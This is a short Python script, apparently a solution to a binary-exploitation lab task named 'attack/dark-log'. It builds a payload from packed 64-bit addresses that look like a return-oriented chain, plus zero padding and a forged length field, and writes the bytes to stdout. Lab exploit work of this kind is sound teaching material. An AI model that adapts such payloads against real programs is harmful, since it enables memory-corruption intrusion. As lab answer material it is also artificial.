#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys, struct
p64 = lambda x: struct.pack('<Q', x)
p32 = lambda x: struct.pack('<I', x)
expression = p64(0) + p64(0x4018a3) + p64(4) + p64(0x4018a4) + p64(0x401677) + b'\x00' * 88
logmsg = b'\x00' * 128
len_field = p32(160)
payload = expression + logmsg + len_field
sys.stdout.buffer.write(payload)
